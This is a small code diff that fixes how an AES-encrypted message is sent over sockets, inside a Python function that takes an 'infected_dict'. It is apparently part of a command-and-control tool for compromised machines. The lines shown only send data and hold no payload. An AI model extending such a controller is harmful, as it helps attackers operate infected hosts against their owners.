@@ -226,7 +226,7 @@ def send_message(message, infected_dict):
             try:
                 encrypted_mess = aes_encrypt(socket_client[2], final_mess)
                 print("mess encrypted")
-                socket_client[0].send(header + encrypted_mess.encode("utf-8"))
+                socket_client[0].send(header + encrypted_mess)
             except Exception as e:
                 print("pb line 231 !")
                 print(e)
